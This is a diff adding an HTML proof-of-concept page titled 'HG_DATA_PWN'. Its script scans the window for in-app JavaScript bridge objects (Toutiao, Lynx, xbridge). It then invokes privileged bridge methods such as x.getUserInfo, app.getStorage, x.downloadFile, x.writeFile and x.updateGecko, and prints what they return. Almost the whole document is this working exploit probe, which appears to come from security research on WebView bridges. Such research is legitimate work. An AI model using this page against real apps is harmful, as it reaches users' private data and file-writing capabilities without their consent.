@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HG_DATA_PWN</title>
+</head>
+<body>
+<h1 id="m">HG_DATA_PWN</h1>
+<pre id="out"></pre>
+<script>
+function log(s) {
+  document.getElementById("out").textContent += s + "\n";
+}
+log("href=" + location.href);
+log("js=1");
+log("keys=" + Object.keys(window).filter(function (k) {
+  return /bridge|webkit|toutiao|lynx|jsb|xbridge|Annie|TTJS|globalProps|__jsb/i.test(k);
+}).join(","));
+log("globalProps=" + typeof window.__globalProps);
+try {
+  if (window.__globalProps) {
+    log("gp_keys=" + Object.keys(window.__globalProps).join(","));
+  }
+} catch (e) { log("gp_err=" + e); }
+var methods = ["x.getMethodList", "x.canIUse", "x.getAppInfo", "x.getUserInfo",
+  "x.open", "x.downloadFile", "x.updateGecko", "x.request", "x.getAbsolutePath",
+  "openSchema", "app.getStorage", "x.saveDataURL", "x.writeFile"];
+function invoke(name) {
+  return new Promise(function (resolve) {
+    var done = false;
+    function fin(v) { if (!done) { done = true; resolve(v); } }
+    setTimeout(function () { fin({timeout: name}); }, 2000);
+    try {
+      if (window.ToutiaoJSBridge && ToutiaoJSBridge.invoke) {
+        ToutiaoJSBridge.invoke(name, {}, function (res) { fin({via: "TT", res: res}); });
+        return;
+      }
+    } catch (e) { fin({via: "TT-err", e: String(e)}); return; }
+    fin({missing: name});
+  });
+}
+(async function () {
+  for (var i = 0; i < methods.length; i++) {
+    var r = await invoke(methods[i]);
+    log(methods[i] + " => " + JSON.stringify(r).slice(0, 300));
+  }
+  log("done");
+})();
+</script>
+</body>
+</html>
